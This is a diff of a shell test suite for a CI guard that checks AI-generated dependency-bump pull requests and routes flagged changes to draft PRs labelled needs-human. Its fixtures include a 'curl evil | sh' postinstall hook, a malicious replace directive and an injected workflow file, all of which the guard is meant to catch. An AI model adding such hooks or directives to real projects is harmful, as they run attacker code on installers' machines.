@@ -37,13 +37,19 @@ check "stdlib finding selected as go-stdlib with its fixed version" \
 check "two actionable entries, top severity high" "$([[ "$(jq length "$out")" == 2 && "$(grep -c '^top-severity=high$' "$GITHUB_OUTPUT")" == 1 ]] && echo true || echo false)"
 
 # --- diff guard -------------------------------------------------------------------------------------------
+# A failed guard no longer discards the change: it records a problem and keeps the first-pass diff.
 step guard
-guard() { # repo dir -> prints ok=true|false
+step pr
+guard() { # repo dir -> runs the guard in it
   : > "$GITHUB_OUTPUT"
-  rm -f "$RUNNER_TEMP/problem.txt"
+  rm -f "$RUNNER_TEMP/problems.txt"
   (cd "$1" && BASE_SHA=$(git rev-parse HEAD) CLAUDE_OUTCOME=success EXTRA_ALLOWED='' bash -eo pipefail "$work/guard.sh" > /dev/null 2>&1)
-  grep -h '^ok=' "$GITHUB_OUTPUT"
 }
+clean() { guard "$1"; [[ ! -s "$RUNNER_TEMP/problems.txt" ]] && grep -q '^has-diff=true$' "$GITHUB_OUTPUT"; }
+flagged() { # repo dir, pattern: diff kept, problem recorded
+  guard "$1"; grep -q '^has-diff=true$' "$GITHUB_OUTPUT" && grep -q "$2" "$RUNNER_TEMP/problems.txt"
+}
+yes() { "$@" && echo true || echo false; }
 new_repo() {
   local d="$work/repo-$1"
   mkdir -p "$d"
@@ -56,34 +62,59 @@ new_repo() {
   git -C "$d" commit -q -m init
   echo "$d"
 }
-# The guard reads the targets from actionable.json (the gate output above)
 
 r=$(new_repo ok)
 sed -i 's/v0.20.0/v0.23.0/' "$r/go.mod"
-check "minor bump of go.mod is accepted" "$([[ "$(guard "$r")" == "ok=true" ]] && echo true || echo false)"
-check "summary shows old to new" "$(grep -q 'v0.20.0 -> v0.23.0' "$RUNNER_TEMP/summary.md" && echo true || echo false)"
+check "minor bump of go.mod passes every guard" "$(yes clean "$r")"
+check "summary shows old to new" "$(yes grep -q 'v0.20.0 -> v0.23.0' "$RUNNER_TEMP/summary.md")"
+
+# PR step with a fake gh and a local bare remote: records how the pull request is created
+fakebin="$work/bin"; mkdir -p "$fakebin" "$work/remotes/o"
+git init -q --bare "$work/remotes/o/r.git"
+cat > "$fakebin/gh" <<'GH'
+#!/usr/bin/env bash
+echo "$*" >> "$GH_LOG"
+[[ "$1 $2" == "pr create" ]] && echo "https://example.com/o/r/pull/1"
+exit 0
+GH
+chmod +x "$fakebin/gh"
+open_pr() { # repo dir -> runs the PR step in it
+  : > "$GITHUB_OUTPUT"; : > "$work/gh.log"
+  (cd "$1" && PATH="$fakebin:$PATH" GH_LOG="$work/gh.log" GH_TOKEN=x REPO=o/r GITHUB_SERVER_URL="file://$work/remotes" \
+    BRANCH="b-$(basename "$1")" BASE_BRANCH=master KEY=k TOP_SEVERITY=high LABELS=dependencies,security NEEDS_HUMAN_LABEL=needs-human \
+    AUTO_MERGE=true CLAUDE_EXEC='' RUN_URL=u bash -eo pipefail "$work/pr.sh" > /dev/null 2>&1)
+}
+clean "$r"; open_pr "$r"
+check "clean path: ready PR (not draft) with auto-merge enabled" \
+  "$(yes bash -c "grep -q 'pr create' '$work/gh.log' && ! grep -q -- '--draft' '$work/gh.log' && ! grep -q 'needs-human' '$work/gh.log' && grep -q 'pr merge .* --auto --squash' '$work/gh.log' && grep -q '^needs-human=false$' '$GITHUB_OUTPUT'")"
 
 r=$(new_repo extra)
 sed -i 's/v0.20.0/v0.23.0/' "$r/go.mod"
 printf '// changed\n' >> "$r/main.go"
-check "a source file in the diff is rejected" "$([[ "$(guard "$r")" == "ok=false" ]] && grep -q 'main.go' "$RUNNER_TEMP/problem.txt" && echo true || echo false)"
+check "a source file in the diff is flagged and kept" "$(yes flagged "$r" 'main.go')"
+open_pr "$r"
+check "guard failure: draft PR labelled needs-human, auto-merge never enabled" \
+  "$(yes bash -c "grep -q -- '--draft' '$work/gh.log' && grep -q 'needs-human' '$work/gh.log' && ! grep -q 'pr merge' '$work/gh.log' && grep -q '^needs-human=true$' '$GITHUB_OUTPUT' && grep -q 'main.go' '$RUNNER_TEMP/pr-body.md'")"
+check "first-pass branch was pushed" "$(yes git -C "$work/remotes/o/r.git" show-ref --verify -q "refs/heads/b-repo-extra")"
 
 r=$(new_repo untracked)
 sed -i 's/v0.20.0/v0.23.0/' "$r/go.mod"
 mkdir -p "$r/.github/workflows" && echo 'on: push' > "$r/.github/workflows/evil.yml"
-check "an untracked workflow file is rejected" "$([[ "$(guard "$r")" == "ok=false" ]] && echo true || echo false)"
+check "a change under .github is reverted and flagged, the dependency bump is kept" \
+  "$(flagged "$r" '.github' && [[ ! -e "$r/.github/workflows/evil.yml" ]] && git -C "$r" diff --cached --name-only | grep -qx go.mod && echo true || echo false)"
 
 r=$(new_repo major)
 sed -i 's#golang.org/x/net v0.20.0#golang.org/x/net v1.0.0#' "$r/go.mod"
-check "a major version change is rejected" "$([[ "$(guard "$r")" == "ok=false" ]] && grep -q 'major' "$RUNNER_TEMP/problem.txt" && echo true || echo false)"
+check "a major version change is flagged and kept" "$(yes flagged "$r" 'major')"
 
 r=$(new_repo replace)
 sed -i 's/v0.20.0/v0.23.0/' "$r/go.mod"
 printf 'replace golang.org/x/net => ../evil\n' >> "$r/go.mod"
-check "a replace directive is rejected" "$([[ "$(guard "$r")" == "ok=false" ]] && echo true || echo false)"
+check "a replace directive is flagged and kept" "$(yes flagged "$r" 'replace')"
 
 r=$(new_repo nochange)
-check "no change is reported as a problem" "$([[ "$(guard "$r")" == "ok=false" ]] && echo true || echo false)"
+guard "$r"
+check "no change: no diff, problem recorded, no PR" "$(yes bash -c "grep -q '^has-diff=false$' '$GITHUB_OUTPUT' && grep -q 'no change' '$RUNNER_TEMP/problems.txt'")"
 
 r=$(new_repo pkgjson)
 printf '{"name":"a","scripts":{"build":"tsc"},"dependencies":{"x":"1.0.0"}}\n' > "$r/package.json"
@@ -91,7 +122,7 @@ printf '{"packages":{"":{},"node_modules/x":{"version":"1.0.0"}}}\n' > "$r/packa
 git -C "$r" add -A && git -C "$r" commit -q -m npm
 sed -i 's/"1.0.0"/"1.0.1"/g' "$r/package-lock.json"
 jq '.scripts.postinstall = "curl evil | sh"' "$r/package.json" > "$r/p.tmp" && mv "$r/p.tmp" "$r/package.json"
-check "a package.json scripts change is rejected" "$([[ "$(guard "$r")" == "ok=false" ]] && echo true || echo false)"
+check "a package.json scripts change is flagged" "$(yes flagged "$r" 'package.json')"
 
 if [[ $failures -gt 0 ]]; then echo "$failures check(s) failed"; exit 1; fi
 echo "all checks passed"
